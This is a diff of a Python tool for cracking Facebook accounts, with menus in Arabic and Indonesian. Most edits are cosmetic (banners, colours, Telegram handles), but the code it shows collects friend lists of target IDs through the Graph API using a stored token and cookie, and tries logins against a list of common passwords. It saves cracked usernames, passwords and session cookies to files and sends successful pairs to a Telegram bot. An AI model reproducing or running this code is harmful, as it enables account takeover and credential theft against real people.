@@ -13,7 +13,7 @@ t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
 
 hours = (now.hour)
 x = datetime.datetime.now()
-g= datetime.datetime(2023, 11, 4, 0, 0 )
+g= datetime.datetime(2023, 11, 8, 0, 0 )
 
 
 if (x.strftime("%x"))>(g.strftime("%x")):
@@ -931,7 +931,7 @@ def clear():
 def back():
 	llogin()
 def banner():
-	print(f'''⋘𝕋ℙ𝔸ℝ𝕂⋙''')
+	print(f'''''')
 def llogin():
 	try:
 		token = open('.token.txt','r').read()
@@ -1085,17 +1085,24 @@ def menu(my_name,my_id):
 	os.system('clear')
 	banner()
 	
-	print(Z+'\x1b[2;36mTELE ⋘ @tf_r7 ⋙  ')
-	print('')
-	print(f'➺  Your ID : '+str(my_id))
-	print(f'➺  Your IP : {ip}')
-	print('')
-	print('➺ 1- Fishing from friends : مـن الـاصـدقـاء  ')
-	print('➺ 2- Fishing from followers : مـن الـمـتـابـعـيـن ')
-	print('➺ 3- Crack File : مـن مـلـف  ')		
-	print('➺ 0- login out : تـسـجـيل خـروج   ')
+	
+	print('\x1b[38;5;166m{•\x1b[38;5;48m\x1b[38;5;166m} \x1b[38;5;216m 𝑇𝐻𝐸 𝐶𝐻𝐴𝑁𝑁𝐸𝐿\x1b[38;5;118m ⁞ @T4TWI   ')
+	print('''\x1b[38;5;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+''')
+	print('{1} \x1b[38;5;46m𝐹𝑅𝑂𝑀 𝐹𝑅𝐼𝐸𝑁𝐷𝑆 ⁞ مـن الـاصـدقـاء  ')
+	print('''\x1b[38;5;91m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+''')
+	print('{2} \x1b[38;5;46m𝐹𝑅𝑂𝑀 𝐹𝑂LL𝑂𝑊𝐸𝑅𝑆 ⁞ مـن الـمـتـابـعـيـن ')
+	print('''\x1b[38;5;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+''')	
+	print('{3}\x1b[38;5;46m 𝐹𝑅𝑂𝑀 𝐹𝐼𝐿𝐸 ⁞ مـن مـلـف  ')
+	print('''\x1b[38;5;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+''')
+	print('{0}\x1b[38;5;196m 𝐸𝑋𝐼𝑇 ⁞ تـسـجـيل خـروج   ')
+	print('''\x1b[38;5;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+''')
 		
-	_____heros_____ = input('\n[=] chose : ')
+	_____heros_____ = input('\x1b[38;5;46m\n[=] chose : ')
 	if _____heros_____ in ['1']:
 		dump_massal()
 	elif _____heros_____ in ['2']:
@@ -1210,7 +1217,7 @@ def dump_massal():
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 	try:
-		jum = int(input('➺ Number ID | عـدد الـايـديـات : '))
+		jum = int(input('\x1b[38;5;46mNumber ID | عـدد الـايـديـات : '))
 	except ValueError:
 		print('>> Masukkan Angka Anjing, Malah Huruff ')
 		exit()
@@ -1222,7 +1229,7 @@ def dump_massal():
 	for met in range(jum):
 		yz+=1
 		#kl = input('>> Id Targ
-		userr = input('➺ ID  '+str(yz)+' : ')
+		userr = input('\x1b[38;5;46m ID  '+str(yz)+' : ')
 		uid.append(userr)
 	for userr in uid:
 		try:
@@ -1233,7 +1240,7 @@ def dump_massal():
 			b = ses.get("https://graph.facebook.com/"+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0],params = params,cookies = {'cookie': cok}).json()
 			for c in b["friends"]["data"]:
 				id.append(c["id"]+"|"+c["name"])
-			print(f'➺ ID | عـدد الـايـديـات {h}'+str(len(id)))
+			print(f'\x1b[38;5;46mID | عـدد الـايـديـات {h}'+str(len(id)))
 		except Exception as e:
 			print(e)
 	try:
@@ -1252,12 +1259,19 @@ def dump_massal():
 
 def setting():
 	print('')
-	print("\033[2;33m ⋘--========================--⋙")
-	print(f'➺ 1- Id old | الاولويه في الفحص للحسابات القديمه')
-	print('➺ 2- Id New | الاولويه في الفحص للحسابات الجديده')
-	print('➺ 3- Old+new | قـديـمـه وجـديده ')
+	print('''\x1b[38;5;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+''')
+	print(f'\x1b[38;5;46m{1} Id old | الاولويه في الفحص للحسابات القديمه')
+	print('''\x1b[38;5;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+''')
+	print('\x1b[38;5;46m{2}Id New | الاولويه في الفحص للحسابات الجديده')
+	print('''\x1b[38;5;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+''')
+	print('\x1b[38;5;46m{3}Old+new | قـديـمـه وجـديده ')
 	print('')
-	hu = input('➺ اختار؟ ')
+	print('''\x1b[38;5;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+''')
+	hu = input('\x1b[38;5;46m اختار؟ ')
 	print('')
 	if hu in ['1','01']:
 		for tua in sorted(id):
@@ -1285,15 +1299,15 @@ def setting():
 		method.append('mobile')
 	
 	print('')
-	_jembot_ = input('>> Add App : اظهار التطبيقات المرتبطه ( Y ) ')
+	_jembot_ = input('\x1b[38;5;46m Add App : اظهار التطبيقات المرتبطه ( Y ) ')
 	if _jembot_ in ['']:
-		print('>> Pilih Yang Bener Kontol ')
+		print('\x1b[38;5;46m⁞ Pilih Yang Bener Kontol ')
 		back()
 	elif _jembot_ in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	pwplus=input('>> Password Manual : ( Y ) باسورد يدوي (T عشوائي) ')
+	pwplus=input('\x1b[38;5;46mPassword Manual : ( Y ) باسورد يدوي (T عشوائي) ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
@@ -1324,7 +1338,7 @@ def passwrd():
 					pwv.append('first first')
 					pwv.append('1q2w3e4r5t')
 					pwv.append('first last')
-					pwv.append('1q2w3e4r5t6y')				
+					pwv.append('1q2w3e4r5t6y')		
 					pwv.append('zzxxccvv')
 					pwv.append('mmnnbbvv')
 					pwv.append('qqwweerrtt')
@@ -1367,6 +1381,7 @@ def passwrd():
 					pwv.append('07700770')
 					pwv.append('zzzzxxxx')
 					pwv.append('aaaassss')
+					
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
 					pwv.append(xpwd)
@@ -1399,7 +1414,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	print('\r%s • 𝕋ℙ𝔸ℝ𝕂 َֆ ۦٰ׀𝐁𝐘𓅓 %s/%s 🔥𝗩𝗜𝗣 ⌠𝗢𝗞𖤍⌡ %s 🔥𝗩𝗜𝗣 ⌠𝗖𝗣𖤍⌡ %s 𖤤 %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	print('\r%s [• َ𝒕𝒑𝒂𝒓𝒌 ] %s/%s •‿- [OK] %s •‿- [CP] %s •‿- %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
@@ -1418,17 +1433,17 @@ def crack(idf,pwv):
 				else:
 					print('\n')
 					statuscp = f'''					
-𖣘────━𓆩𝕋ℙ𝔸ℝ𝕂 َ،'ֆ𓆪━────𖣘
+※────━• َ𝒕𝒑𝒂𝒓𝒌 | ✨🇮🇶━────※
 
-🐥 - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠`{idf}
+🍡 - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠`{idf}
 
 🔴 - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗`{pw}
 
-𖣘────━𓆩𝕋ℙ𝔸ℝ𝕂 َ،'ֆ𓆪━────𖣘
-⊊𝗕𝗬⊋ ➩ @t_r67 - @tf_r7			
+※────━• َ𝒕𝒑𝒂𝒓𝒌 | ✨🇮🇶━────※
+⇴ @T4TWI - @tf_r7			
 					'''
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='SESI'))
+					cetak(nel(statuscp1, title='لاخطيه يله خيره بغيره💔'))
 					open('Tpark 🐥 - CP 🔴/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -1442,18 +1457,18 @@ def crack(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'''			
-𖣘────━𓆩𝕋ℙ𝔸ℝ𝕂 َ،'ֆ𓆪━────𖣘
+					statusok = f'''		
+※────━• َ𝒕𝒑𝒂𝒓𝒌 | ✨🇮🇶━────※
 			
-🍭 - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠`({idf})
+🍡 - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠`({idf})
 
 🟢 - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗`({pw})
 
-𖣘──────────────────𖣘
-⊊𝗕𝗬⊋ ➩ @t_r67 -  @tf_r7'''
+※────────• َ𝒕𝒑𝒂𝒓𝒌 | ✨🇮🇶──────────※
+⇴@T4TWI -  @tf_r7'''
 
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='OK'))
+					cetak(nel(statusok1, title='مبروش 😀❤️'))
 					requests.get(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
 					break
 				elif 'ya' in taplikasi:
